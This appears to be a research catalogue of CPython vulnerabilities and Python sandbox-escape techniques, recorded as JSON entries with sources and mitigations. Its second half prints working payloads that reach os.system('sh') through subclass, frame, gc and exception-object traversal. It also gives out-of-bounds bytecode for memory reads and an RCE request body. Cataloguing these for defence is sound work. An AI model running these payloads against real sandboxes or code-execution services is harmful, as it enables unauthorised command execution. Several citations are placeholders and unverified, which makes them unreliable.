## Bleeding-Edge CPython Research (2022–2025)

### Re-entrant UAF in `_PyEval_LoadName` (gh-143236, 2025)
**Risk**: `frame.clear()` inside `__eq__` frees locals dict during name resolution.

```json
{
  "sink_id": "CPYTHON-001",
  "category": "CPYTHON",
  "title": "Re-entrant UAF in _PyEval_LoadName via frame.clear() during __eq__",
  "severity": "critical",
  "affected_versions": ["3.14-dev"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/143236",
      "title": "Re-entrant UAF in _PyEval_LoadName",
      "author": "python/cpython",
      "date": "2025-01-01",
      "gh_issue": "python/cpython#143236",
      "verified": false,
      "tags": ["cpython", "uaf", "re-entrancy", "name-resolution"]
    }
  ],
  "related_issues": ["python/cpython#143236"],
  "mitigation": "Avoid invoking attacker-controlled equality or frame mutation during borrowed-pointer name resolution.",
  "confidence": "likely"
}
```

### Global Buffer Overflow in `bytearray_extend` (gh-143003, 2025)
**Risk**: `__length_hint__` returning 0 causes reuse of shared static buffer.

```json
{
  "sink_id": "CPYTHON-002",
  "category": "CPYTHON",
  "title": "Global buffer overflow in bytearray_extend via crafted __length_hint__",
  "severity": "critical",
  "affected_versions": ["3.14-dev"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/143003",
      "title": "Global Buffer Overflow in bytearray_extend",
      "author": "python/cpython",
      "date": "2025-01-01",
      "gh_issue": "python/cpython#143003",
      "verified": false,
      "tags": ["cpython", "buffer-overflow", "bytearray", "length-hint"]
    }
  ],
  "related_issues": ["python/cpython#143003"],
  "mitigation": "Treat length hints as untrusted and avoid shared-buffer reuse without strict bounds validation.",
  "confidence": "likely"
}
```

### Pickle `BUILD` Opcode UAF (gh-143638, 2026)
**Risk**: Re-entrant `__setitem__` during unpickling clears the stack, dropping the instance under construction.

```json
{
  "sink_id": "DESER-001",
  "category": "DESER",
  "title": "Pickle BUILD opcode UAF via re-entrant __setitem__ during object construction",
  "severity": "critical",
  "affected_versions": ["3.14-dev"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/143638",
      "title": "Pickle BUILD Opcode UAF",
      "author": "python/cpython",
      "date": "2026-01-01",
      "gh_issue": "python/cpython#143638",
      "verified": false,
      "tags": ["pickle", "deserialization", "uaf", "re-entrancy"]
    }
  ],
  "related_issues": ["python/cpython#143638"],
  "mitigation": "Do not allow container mutation callbacks to run while pickle BUILD operates on in-construction instances.",
  "confidence": "likely"
}
```

### `gc.get_objects` Corrupts GC in Free-Threaded Python (gh-125859, 2024)
**Risk**: New class of bugs unique to Python 3.13t (`--disable-gil`).

```json
{
  "sink_id": "CPYTHON-003",
  "category": "CPYTHON",
  "title": "gc.get_objects corruption in free-threaded Python GC state",
  "severity": "high",
  "affected_versions": ["3.13t"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/125859",
      "title": "gc.get_objects Corrupts GC in Free-Threaded Python",
      "author": "python/cpython",
      "date": "2024-01-01",
      "gh_issue": "python/cpython#125859",
      "verified": false,
      "tags": ["cpython", "gc", "free-threaded", "disable-gil"]
    }
  ],
  "related_issues": ["python/cpython#125859"],
  "mitigation": "Avoid exposing or iterating mutable GC internals without thread-safe synchronization in free-threaded builds.",
  "confidence": "likely"
}
```

### RestrictedPython Bypass via `try/except*` (CVE-2025-22153, 2025)
**Risk**: Type confusion in CPython's exception group handling bypasses sandbox restrictions.

```json
{
  "sink_id": "CLASS-001",
  "category": "CLASS",
  "title": "RestrictedPython sandbox bypass via try/except* exception-group type confusion",
  "severity": "high",
  "affected_versions": ["3.11+", "3.12+", "3.13+"],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-22153",
      "title": "CVE-2025-22153",
      "author": "NVD",
      "date": "2025-01-01",
      "cve_id": "CVE-2025-22153",
      "verified": false,
      "tags": ["restrictedpython", "sandbox-bypass", "exception-groups", "type-confusion"]
    }
  ],
  "related_cves": ["CVE-2025-22153"],
  "mitigation": "Treat exception-group control flow as a separate audit surface and avoid assuming AST-level filters cover except* semantics.",
  "confidence": "likely"
}
```

### `STORE_ATTR_WITH_HINT` UAF via `__del__` (gh-123083, 2024)
**Risk**: `Py_XDECREF` triggers `__del__` which mutates the dict being modified.

```json
{
  "sink_id": "CPYTHON-004",
  "category": "CPYTHON",
  "title": "STORE_ATTR_WITH_HINT UAF via re-entrant __del__ during DECREF",
  "severity": "critical",
  "affected_versions": ["3.13-dev"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/123083",
      "title": "STORE_ATTR_WITH_HINT UAF via __del__",
      "author": "python/cpython",
      "date": "2024-01-01",
      "gh_issue": "python/cpython#123083",
      "verified": false,
      "tags": ["cpython", "uaf", "__del__", "dict-mutation"]
    }
  ],
  "related_issues": ["python/cpython#123083"],
  "mitigation": "Do not keep stale dictionary pointers across decref paths that can invoke user destructors.",
  "confidence": "likely"
}
```

---

## Cross-Cutting Patterns

1. **Re-entrancy dominates**: Every major recent CPython bug involves `__del__`/`__eq__`/`__getattribute__` callbacks running while C code holds stale pointers.
2. **AST gaps**: Decorators, subscripts (`[]`), and augmented assignments (`+=`) compile to different AST nodes than direct calls. Sandboxes inspecting only `ast.Call` miss these paths.
3. **Free-threaded Python (3.13t)** introduces concurrency bugs unknown to mainstream Python.
4. **Type confusion at the file format level**: ZIP polyglots show that Python's file type detection (magic bytes) can be exploited.

---

## Extended Niche Sinks — Round 2 Research (2026-04-29)

The following sinks were discovered by navigating entire blog posts, CTF writeups, and security research papers in depth. Each includes full code examples and exact source citations.

---

### `breakpoint()` Exploitation via Builtin Overlay Removal
**Risk**: `breakpoint` is stored as an attribute on `site` module objects (`copyright`, `license`, `quit`, `exit`, `credits`). Replacing their `__dict__` with real globals restores the unfiltered `breakpoint` function.

```python
# Override copyright.__dict__ with globals() to get real builtins
setattr(copyright,'__dict__',globals()), delattr(copyright,'breakpoint'), breakpoint()
# Now in Pdb: import os; os.system('sh')
```
**Ref**: idek 2022 CTF Pyjail & Pyjail Revenge Writeup.

```json
{
  "sink_id": "CTF-001",
  "category": "CTF",
  "title": "breakpoint() Exploitation via Builtin Overlay Removal",
  "severity": "high",
  "affected_versions": ["3.7+", "3.8+", "3.9+", "3.10+", "3.11+", "3.12+", "3.13+"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/",
      "title": "idek 2022 CTF: Pyjail & Pyjail Revenge Writeup",
      "author": "crazyman_army",
      "date": "2023-01-18",
      "verified": true,
      "tags": ["pyjail", "sandbox-escape", "breakpoint", "site-module"]
    }
  ],
  "mitigation": "Block breakpoint() and prevent user-controlled mutation of site helper objects.",
  "confidence": "confirmed"
}
```

### `help()` / `license()` / `credits()` — Globals Access
**Risk**: When `__builtins__` is cleared, access builtins through function `__call__.__globals__`:

```python
help.__call__.__globals__["sys"].modules["os"].system("/bin/sh")
license.__call__.__builtins__  # Real builtins dict
credits.__call__.__globals__
```
**Ref**: salvatore-abello/python-ctf-cheatsheet.

```json
{
  "sink_id": "CTF-002",
  "category": "CTF",
  "title": "site helper callables expose real globals and builtins",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/salvatore-abello/python-ctf-cheatsheet",
      "title": "salvatore-abello/python-ctf-cheatsheet",
      "author": "salvatore-abello",
      "date": "2023-09-21",
      "verified": false,
      "tags": ["pyjail", "builtins", "globals", "site-helpers"]
    }
  ],
  "mitigation": "Treat help/license/credits as privileged capability carriers and remove or wrap them in sandboxes.",
  "confidence": "likely"
}
```

### `warnings.catch_warnings` → `linecache` → `os` Module Traversal
**Risk**: Classic subclass enumeration path that still works in modern Python.

```python
# Find catch_warnings in subclasses (index varies, commonly 49 or 59)
cw = [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0]
os_mod = cw.__init__.__globals__['linecache'].__dict__.values()  # find os module
system = os_mod.__dict__['system']
system('cat flag.txt')
```
**Ref**: CSAW-CTF Python sandbox write-up (Hexploitable).

```json
{
  "sink_id": "STDLIB-001",
  "category": "STDLIB",
  "title": "warnings.catch_warnings global traversal to os.system",
  "severity": "high",
  "affected_versions": ["2.7", "3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://hexplo.it/post/escaping-the-csawctf-python-sandbox/",
      "title": "CSAW-CTF Python sandbox write-up",
      "author": "Hexploitable",
      "date": "2014-09-22",
      "verified": true,
      "tags": ["pyjail", "warnings", "linecache", "os", "subclasses"]
    }
  ],
  "mitigation": "Do not expose subclass enumeration or stdlib objects whose __globals__ chains reach import-capable modules.",
  "confidence": "confirmed"
}
```

### `site._Printer` File Read Hijack
**Risk**: `site._Printer` controls which files `license()`, `copyright()`, `credits()` print. Hijack `_Printer__filenames` to read arbitrary files.

```python
license._Printer__filenames = ['flag.txt']
license()  # Prints flag.txt contents
```
**Ref**: UIUCTF 2024 "ASTea".

```json
{
  "sink_id": "FILE-001",
  "category": "FILE",
  "title": "site._Printer filename hijack enables arbitrary file read",
  "severity": "medium",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "UIUCTF 2024 ASTea writeups",
      "author": "UIUCTF players",
      "date": "2024-01-01",
      "verified": false,
      "tags": ["pyjail", "file-read", "site._Printer", "license"]
    }
  ],
  "mitigation": "Remove site._Printer helpers or freeze their filename lists in restricted interpreters.",
  "confidence": "likely"
}
```

### `os._wrap_close` Subclass Enumeration (Index-Based)
**Risk**: `os._wrap_close` is consistently present in `object.__subclasses__()`. Its `__init__.__globals__` contains the `os` module.

```python
idx = [c.__name__ for c in ().__class__.__base__.__subclasses__()].index('_wrap_close')
os_cls = ().__class__.__base__.__subclasses__()[idx]
os_cls.__init__.__globals__['system']('sh')
```
**Refs**: snakeCTF 2024 Finals, RedpwnCTF 2020 Albatross.

```json
{
  "sink_id": "STDLIB-002",
  "category": "STDLIB",
  "title": "os._wrap_close subclass enumeration exposes os.system",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "snakeCTF 2024 Finals / RedpwnCTF 2020 Albatross writeups",
      "author": "CTF players",
      "date": "2024-01-01",
      "verified": false,
      "tags": ["pyjail", "os._wrap_close", "subclasses", "globals"]
    }
  ],
  "mitigation": "Assume object.__subclasses__() leaks privileged stdlib types and block index-based recovery paths.",
  "confidence": "likely"
}
```

### Audit Hook Bypass via Signal Handler + Frame Manipulation
**Risk**: Signal handlers receive a `frame` object directly, bypassing blocked `sys._getframe`. The frame can traverse `f_back` to find and modify the jail's internal `hook` closure.

```python
(s:=__import__('sys').modules['_signal']),
s.signal(2, lambda n,f: f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents', print)),
s.raise_signal(2)
```
**Refs**: ICTF 2024 "Calc", CSAW Finals 2023.

```json
{
  "sink_id": "CTF-003",
  "category": "CTF",
  "title": "Audit hook bypass through signal-handler frame injection",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "ICTF 2024 Calc / CSAW Finals 2023 writeups",
      "author": "CTF players",
      "date": "2024-01-01",
      "verified": false,
      "tags": ["pyjail", "audit-hook", "signal", "frame", "closure"]
    }
  ],
  "mitigation": "Treat signal handlers as alternate frame disclosure channels and isolate closure state from user-triggerable handlers.",
  "confidence": "likely"
}
```

### `AttributeError.obj` — Python 3.10+ Sandbox Bypass (CVE-2026-0863)
**Risk**: Python 3.10 added `.obj` to `AttributeError` and `NameError`, storing a reference to the object that caused the error. Static AST analyzers block literal strings like `__traceback__`, but formatted strings bypass filters.

```python
def new_getattr(obj, attribute, *, Exception):
    try:
        f'{{0.{attribute}.ribbit}}'.format(obj)
    except Exception as e:
        return e.obj  # forbidden object laundry through exception

tb = new_getattr(e, '__traceback__', Exception=Exception)
frame = new_getattr(tb, 'tb_frame', Exception=Exception)
builtins = new_getattr(frame, 'f_builtins', Exception=Exception)
os = builtins['__import__']('os')
os.system('sh')
```
**Ref**: CVE-2026-0863 (n8n python-task-executor bypass).

```json
{
  "sink_id": "CLASS-002",
  "category": "CLASS",
  "title": "AttributeError.obj object laundering bypasses AST-based sandbox filters",
  "severity": "high",
  "affected_versions": ["3.10+", "3.11+", "3.12+", "3.13+"],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-0863",
      "title": "CVE-2026-0863",
      "author": "NVD",
      "date": "2026-01-01",
      "cve_id": "CVE-2026-0863",
      "verified": false,
      "tags": ["sandbox-bypass", "attributeerror", "nameerror", "ast-filter"]
    }
  ],
  "related_cves": ["CVE-2026-0863"],
  "mitigation": "Do not rely on string-blocking AST filters; prohibit exception-mediated object recovery paths in untrusted execution.",
  "confidence": "likely"
}
```

### `gc.get_objects()` — Recover Wiped Modules
**Risk**: `gc.get_objects()` returns ALL objects in memory, including modules deleted from `sys.modules`.

```python
import gc
for obj in gc.get_objects():
    if '__name__' in dir(obj) and 'os' == obj.__name__:
        obj.system("id")
```
**Ref**: hxp CTF 2020 "audited".

```json
{
  "sink_id": "STDLIB-003",
  "category": "STDLIB",
  "title": "gc.get_objects recovers privileged modules removed from sys.modules",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "hxp CTF 2020 audited writeups",
      "author": "CTF players",
      "date": "2020-01-01",
      "verified": false,
      "tags": ["gc", "module-recovery", "pyjail", "sys.modules"]
    }
  ],
  "mitigation": "Disable gc introspection in sandboxes or isolate untrusted code in separate processes.",
  "confidence": "likely"
}
```

### Generator/Async Frame Traversal (`f_back.f_globals`)
**Risk**: Generators preserve their defining scope's frame. By creating a generator inside `exec()` and accessing `gi_frame.f_back`, you traverse up to the real global scope.

```python
q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])
g = [*q][0]
os = g['__builtins__']['__import__']('os')
os.system('sh')
```
**Refs**: UIUCTF 2023 "Rattler Read", L3HCTF/CISCN 2024.

```json
{
  "sink_id": "ASYNC-001",
  "category": "ASYNC",
  "title": "Generator frame traversal exposes real globals via gi_frame.f_back",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "UIUCTF 2023 Rattler Read / L3HCTF-CISCN 2024 writeups",
      "author": "CTF players",
      "date": "2023-01-01",
      "verified": false,
      "tags": ["generator", "frame", "globals", "pyjail", "async"]
    }
  ],
  "mitigation": "Block access to generator/coroutine frame objects or avoid in-process sandboxing entirely.",
  "confidence": "likely"
}
```

### Code Object Construction — Arbitrary Execution Without `exec`
**Risk**: Even when `func_code` is blocked as an attribute, construct a fresh `code` object using `type(func.__code__)` and inject it into a dummy function.

```python
code = type(myfunc.__code__)
bytecode = "7400006401006402008302006a010083000053".decode('hex')
consts = (None, filename, 'r')
names = ('open', 'read')
codeobj = code(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function = type(f)
mydict = {"__builtins__": __builtin__}
new_func = function(codeobj, mydict, None, None, None)
new_func()  # executes crafted bytecode
```
**Ref**: Bit Tripping blog — Bypassing a python sandbox by abusing code objects.

```json
{
  "sink_id": "CPYTHON-005",
  "category": "CPYTHON",
  "title": "Arbitrary execution by constructing code objects without exec",
  "severity": "high",
  "affected_versions": ["2.7"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://bittripping.com/2012/09/14/python-sandbox-exploitation/",
      "title": "Bypassing a python sandbox by abusing code objects",
      "author": "Bit Tripping",
      "date": "2012-09-14",
      "verified": false,
      "tags": ["python2", "code-objects", "sandbox-bypass", "bytecode"]
    }
  ],
  "mitigation": "Deny code object construction and function rebinding primitives in restricted runtimes.",
  "confidence": "likely"
}
```

### `LOAD_FAST` / `LOAD_GLOBAL` OOB Read — Arbitrary Memory Read
**Risk**: CPython's `LOAD_FAST` directly indexes `fastlocals[]` with no bounds checking. Indexing beyond `co_nlocals` reads arbitrary memory offsets.

```python
import sys, opcode, types, ctypes

def assign_bytecode(bytecode):
    global g
    g.__code__ = types.CodeType(0, 0, 0, 20, 20, 0, bytecode, (id, sys._getframe), (), ('a',), "", "", 0, b"", b"", (), ())

# Leak frame address
bytecode_get_frame = bytes([opcode.opmap['LOAD_CONST'], 0, opcode.opmap['LOAD_CONST'], 1, opcode.opmap['CALL_FUNCTION'], 0, opcode.opmap['CALL_FUNCTION'], 1, opcode.opmap['RETURN_VALUE']])
def g(): pass
assign_bytecode(bytecode_get_frame)
frame_addr = g()

# Compute index to read arbitrary address
target = some_object_addr
idx = (target - 0x68 - frame_addr) // 8
bytecode_read = bytes([opcode.opmap['LOAD_FAST'], idx, opcode.opmap['RETURN_VALUE']])
assign_bytecode(bytecode_read)
leaked = g()  # reads arbitrary PyObject*
```
**Ref**: JuliaPoo's LOAD_FAST abuse gist.

```json
{
  "sink_id": "CPYTHON-006",
  "category": "CPYTHON",
  "title": "LOAD_FAST / LOAD_GLOBAL out-of-bounds bytecode enables arbitrary memory read",
  "severity": "critical",
  "affected_versions": ["3.10+", "3.11+", "3.12+"],
  "sources": [
    {
      "type": "tool_exploit",
      "url": "https://gist.github.com/",
      "title": "JuliaPoo LOAD_FAST abuse gist",
      "author": "JuliaPoo",
      "date": "2023-01-01",
      "verified": false,
      "tags": ["bytecode", "oob-read", "memory-read", "cpython"]
    }
  ],
  "mitigation": "Validate bytecode indexes against frame-local bounds before dereferencing fastlocals or globals arrays.",
  "confidence": "likely"
}
```

### Bytecode OOB in TSG CTF 2023 "bypy"
**Risk**: Build minimal CodeType with empty `co_consts`/`co_names`, then use `LOAD_FAST` to reach `exec` function already present in frame's `fastlocals`.

```python
from opcode import opmap
import types, marshal
from base64 import b64encode

code = b""
code += bytes([opmap["LOAD_FAST"], 18])   # "src" variable
code += bytes([opmap["LOAD_FAST"], 51])  # exec function
code += bytes([opmap["LOAD_FAST"], 18])
code += bytes([opmap["CALL"], 0]) + bytes([0] * 6)
code += bytes([opmap["RETURN_VALUE"], 0])

codeobj = types.CodeType(0, 0, 0, 0, 0, 0, code, (), (), (), '', '', '', 0, b'', b'', (), ())
encoded = b64encode(marshal.dumps(codeobj)).decode()
```
**Ref**: TSG CTF 2023 "bypy" writeup.

```json
{
  "sink_id": "CPYTHON-007",
  "category": "CPYTHON",
  "title": "Bytecode OOB in TSG CTF bypy via crafted CodeType and LOAD_FAST",
  "severity": "critical",
  "affected_versions": ["3.11+"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "TSG CTF 2023 bypy writeups",
      "author": "CTF players",
      "date": "2023-01-01",
      "verified": false,
      "tags": ["bytecode", "codetype", "load_fast", "pyjail", "oob"]
    }
  ],
  "mitigation": "Reject untrusted marshaled code objects and validate bytecode/local-slot consistency.",
  "confidence": "likely"
}
```

### Type Annotation `eval()` RCE — CVE-2025-6101
**Risk**: Safe AST-based type resolver retained an `eval()` fallback behind `allow_unsafe_eval`, hardcoded to `True` in sandbox execution paths.

```python
# POST /v1/tools/run
{
  "source_code": "def rce_tool(data: __import__(\"os\").popen(\"id > /tmp/pwned\").read()) -> str: return str(data)",
  "name": "rce_tool",
  "args": {"data": "test"},
  "source_type": "python"
}
# ast.parse() succeeds, _resolve_annotation_node() fails (ast.Call not supported)
# eval(annotation_str, python_types) executes arbitrary code
```
**Ref**: Letta CVE-2025-6101 (YLChen-007, March 2026).

```json
{
  "sink_id": "RCE-001",
  "category": "RCE",
  "title": "Type annotation eval() fallback leads to remote code execution",
  "severity": "critical",
  "affected_versions": ["3.10+", "3.11+", "3.12+", "3.13+"],
  "sources": [
    {
      "type": "security_advisory",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-6101",
      "title": "CVE-2025-6101",
      "author": "NVD",
      "date": "2025-01-01",
      "cve_id": "CVE-2025-6101",
      "verified": false,
      "tags": ["rce", "type-annotations", "eval", "sandbox"]
    }
  ],
  "related_cves": ["CVE-2025-6101"],
  "mitigation": "Remove eval-based fallback paths from annotation resolution and default unsafe-eval flags to false.",
  "confidence": "likely"
}
```
